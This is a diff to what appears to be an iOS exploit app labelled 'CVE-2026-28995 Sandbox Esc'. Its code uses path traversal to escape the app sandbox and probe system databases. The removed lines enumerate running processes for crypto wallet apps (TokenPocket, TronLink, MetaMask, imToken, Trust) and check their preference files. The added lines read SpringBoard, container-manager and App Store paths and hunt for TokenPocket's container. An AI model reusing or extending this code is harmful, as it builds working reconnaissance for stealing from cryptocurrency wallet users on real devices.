@@ -662,7 +662,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *sbConf = [UIButtonConfiguration filledButtonConfiguration];
     sbConf.baseBackgroundColor = [UIColor systemTealColor];
     self.sandboxEscapeButton.configuration = sbConf;
-    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v3" forState:UIControlStateNormal];
+    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v4" forState:UIControlStateNormal];
     [self.sandboxEscapeButton addTarget:self action:@selector(sandboxEscapeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.sandboxEscapeButton];
 
@@ -7253,92 +7253,113 @@ static void *iohid_threadCopyEvent(void *arg) {
         [log appendString:@"[-] NOT accessible (sandbox intact)\n"];
     }
 
-    // Test 2: sysctl KERN_PROC_ALL — find wallet app PIDs
-    [log appendString:@"\n--- Test 2: sysctl KERN_PROC_ALL (running processes) ---\n"];
-    int mib[4] = { CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0 };
-    size_t bufSize = 0;
-    if (sysctl(mib, 4, NULL, &bufSize, NULL, 0) == 0 && bufSize > 0) {
-        struct kinfo_proc *buf = (struct kinfo_proc *)malloc(bufSize);
-        if (buf && sysctl(mib, 4, buf, &bufSize, NULL, 0) == 0) {
-            size_t count = bufSize / sizeof(struct kinfo_proc);
-            [log appendFormat:@"  %zu procs (kinfo_proc=%zu bytes)\n",
-                count, sizeof(struct kinfo_proc)];
+    // ============================================================
+    // v4: Probe SpringBoard + system app databases for bundleID→UUID
+    // ============================================================
 
-            int shown = 0;
-            for (size_t i = 0; i < count && shown < 40; i++) {
-                NSString *pname = [NSString stringWithUTF8String:
-                    buf[i].kp_proc.p_comm];
-                if (pname.length == 0) continue;
-                BOOL match = [pname.lowercaseString containsString:@"token"] ||
-                    [pname.lowercaseString containsString:@"tron"] ||
-                    [pname.lowercaseString containsString:@"wallet"] ||
-                    [pname.lowercaseString containsString:@"imtoken"] ||
-                    [pname.lowercaseString containsString:@"meta"] ||
-                    [pname.lowercaseString containsString:@"trust"];
-                if (shown < 25 || match) {
-                    [log appendFormat:@"  PID=%d %@%@\n",
-                        buf[i].kp_proc.p_pid, pname, match ? @" ***" : @""];
-                    shown++;
-                }
+    #define BASE @"../../../../../../../../../../../../../"
+
+    // Test 2: SpringBoard plists (icon layout = installed apps)
+    [log appendString:@"--- Test 2: SpringBoard plists ---\n"];
+    NSArray *sbPaths = @[
+        @"var/mobile/Library/SpringBoard/IconState.plist",
+        @"var/mobile/Library/SpringBoard/IconData.plist",
+        @"var/mobile/Library/SpringBoard/DesiredIconState.plist",
+        @"var/mobile/Library/SpringBoard/ApplicationShortcuts/",
+        @"var/mobile/Library/SpringBoard/Recents/",
+        @"var/mobile/Library/FrontBoard/applicationState.plist",
+    ];
+    for (NSString *sub in sbPaths) {
+        NSString *p = [[BASE stringByAppendingString:sub] stringByExpandingTildeInPath];
+        BOOL ex = [fm fileExistsAtPath:p];
+        if (ex) {
+            id obj = [NSDictionary dictionaryWithContentsOfFile:p];
+            if (!obj) obj = [NSArray arrayWithContentsOfFile:p];
+            if (!obj) {
+                NSError *err = nil;
+                obj = [NSString stringWithContentsOfFile:p encoding:NSUTF8StringEncoding error:&err];
+                if (obj) obj = [@"text:" stringByAppendingString:[(NSString*)obj substringToIndex:MIN(200, [(NSString*)obj length])]];
             }
+            [log appendFormat:@"  [+] %@: %@\n", [sub lastPathComponent],
+                [obj isKindOfClass:[NSDictionary class]] ? [NSString stringWithFormat:@"plist %lu keys", (unsigned long)[(NSDictionary*)obj count]] :
+                [obj isKindOfClass:[NSArray class]] ? [NSString stringWithFormat:@"array %lu items", (unsigned long)[(NSArray*)obj count]] :
+                [obj isKindOfClass:[NSString class]] ? (NSString*)obj : @"unknown"];
+        } else {
+            [log appendFormat:@"  [-] %@\n", sub];
         }
-        free(buf);
-    } else {
-        [log appendString:@"  sysctl failed\n"];
     }
 
-    // Test 3: iOS 26+ container DB paths
-    [log appendString:@"\n--- Test 3: iOS 26+ DB paths ---\n"];
-    NSArray *v3paths = @[
-        @"../../../../../../../../../../../../../var/db/lsd/com.apple.lsd.plist",
-        @"../../../../../../../../../../../../../var/mobile/Library/Caches/com.apple.lsd.plist",
-        @"../../../../../../../../../../../../../var/installd/Library/MobileInstallation/LocalStore.sqlite",
-        @"../../../../../../../../../../../../../var/installd/Library/MobileInstallation/InstallationJournal.sqlite",
+    // Test 3: containermanagerd / installd state
+    [log appendString:@"\n--- Test 3: Container manager state ---\n"];
+    NSArray *cmPaths = @[
+        @"var/db/containermanager/",
+        @"var/containermanagerd/",
+        @"private/var/db/containermanagerd/",
+        @"var/mobile/Library/Caches/com.apple.containermanagerd/",
+        @"var/mobile/Library/Caches/com.apple.mobile.installation.plist",
+        @"var/mobile/Library/Caches/com.apple.MobileInstallation/",
     ];
-    for (NSString *relPath in v3paths) {
-        NSString *absPath = [relPath stringByExpandingTildeInPath];
-        BOOL exists = [fm fileExistsAtPath:absPath];
-        [log appendFormat:@"  %@: %@\n", [relPath lastPathComponent],
-            exists ? @"EXISTS" : @"no"];
-        if (exists && ![relPath hasSuffix:@".sqlite"]) {
-            NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:absPath];
+    for (NSString *sub in cmPaths) {
+        NSString *p = [[BASE stringByAppendingString:sub] stringByExpandingTildeInPath];
+        BOOL ex = [fm fileExistsAtPath:p];
+        [log appendFormat:@"  %@ %@\n", ex ? @"[+]" : @"[-]", sub];
+        if (ex && [sub hasSuffix:@".plist"]) {
+            NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:p];
             if (d) [log appendFormat:@"    plist: %lu keys\n", (unsigned long)d.count];
         }
     }
 
-    // Test 4: Wallet app preferences by known bundle IDs
-    [log appendString:@"\n--- Test 4: Wallet prefs by bundle ID ---\n"];
-    NSArray *walletBIDs = @[
-        @"org.tokenpocket.TokenPocket",
-        @"com.tokenpocket.wallet",
-        @"com.tokenpocket.tokenpocket",
-        @"io.tokenpocket.tokenpocket",
-        @"org.tron.TronLink",
-        @"com.tronlink.wallet",
-        @"com.trustwallet.app",
-        @"io.metamask.MetaMask",
-        @"com.imtoken.wallet",
+    // Test 4: Duet / CoreDuet / AppPrediction (Siri app suggestions)
+    [log appendString:@"\n--- Test 4: Duet / AppPrediction DBs ---\n"];
+    NSArray *duetPaths = @[
+        @"var/mobile/Library/Duet/",
+        @"var/mobile/Library/CoreDuet/",
+        @"var/mobile/Library/AppPrediction/",
+        @"var/mobile/Library/Caches/com.apple.duetexpertd/",
+        @"var/mobile/Library/Caches/com.apple.AppPrediction/",
     ];
-    for (NSString *bundleID in walletBIDs) {
-        NSString *prefsRel = [NSString stringWithFormat:
-            @"../../../../../../../../../../../../../var/mobile/Library/Preferences/%@.plist", bundleID];
-        NSString *prefsPath = [prefsRel stringByExpandingTildeInPath];
-        if ([fm fileExistsAtPath:prefsPath]) {
-            NSDictionary *p = [NSDictionary dictionaryWithContentsOfFile:prefsPath];
-            [log appendFormat:@"  [+] %@ EXISTS (%lu keys)\n",
-                bundleID, (unsigned long)p.count];
-        } else {
-            [log appendFormat:@"  [-] %@\n", bundleID];
+    for (NSString *sub in duetPaths) {
+        NSString *p = [[BASE stringByAppendingString:sub] stringByExpandingTildeInPath];
+        BOOL ex = [fm fileExistsAtPath:p];
+        [log appendFormat:@"  %@ %@\n", ex ? @"[+]" : @"[-]", sub];
+    }
+
+    // Test 5: iTunes / App Store metadata
+    [log appendString:@"\n--- Test 5: App Store / iTunes metadata ---\n"];
+    NSArray *storePaths = @[
+        @"var/mobile/Library/Caches/com.apple.appstored/",
+        @"var/mobile/Media/iTunes_Control/iTunes/",
+        @"var/mobile/Library/Caches/com.apple.iTunesStore/",
+    ];
+    for (NSString *sub in storePaths) {
+        NSString *p = [[BASE stringByAppendingString:sub] stringByExpandingTildeInPath];
+        BOOL ex = [fm fileExistsAtPath:p];
+        [log appendFormat:@"  %@ %@\n", ex ? @"[+]" : @"[-]", sub];
+        if (ex) {
+            // Try to list contents (may fail due to dir enumeration block)
+            NSError *err = nil;
+            NSArray *items = [fm contentsOfDirectoryAtPath:p error:&err];
+            if (items.count > 0) {
+                [log appendFormat:@"    contents: %@\n",
+                    [[items subarrayWithRange:NSMakeRange(0, MIN(10, items.count))] componentsJoinedByString:@", "]];
+            }
         }
     }
 
-    // Test 5: Our home + try to read neighbor container metadata
-    [log appendString:@"\n--- Test 5: Container neighborhood ---\n"];
-    NSString *ourHome = NSHomeDirectory();
-    [log appendFormat:@"  Our home: %@\n", ourHome];
-    // Our UUID from v2: 68CD15EB-0A92-4C87-BCAE-DF435BD89CEA
-    NSString *ourUUID = [ourHome lastPathComponent];
-    [log appendFormat:@"  Our UUID: %@\n", ourUUID];
+    // Test 6: Try known TokenPocket container metadata patterns
+    [log appendString:@"\n--- Test 6: TokenPocket bundle container ---\n"];
+    // App bundle containers use a different UUID than data containers,
+    // but the bundle .app directory name reveals the app identity
+    // Try reading the AppDomain (bundle) metadata
+    NSArray *bundlePaths = @[
+        @"var/containers/Bundle/Application/",
+        @"private/var/containers/Bundle/Application/",
+    ];
+    for (NSString *sub in bundlePaths) {
+        NSString *p = [[BASE stringByAppendingString:sub] stringByExpandingTildeInPath];
+        BOOL ex = [fm fileExistsAtPath:p];
+        [log appendFormat:@"  %@ %@\n", ex ? @"[+] EXISTS" : @"[-] no", sub];
+    }
 
     dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
 }
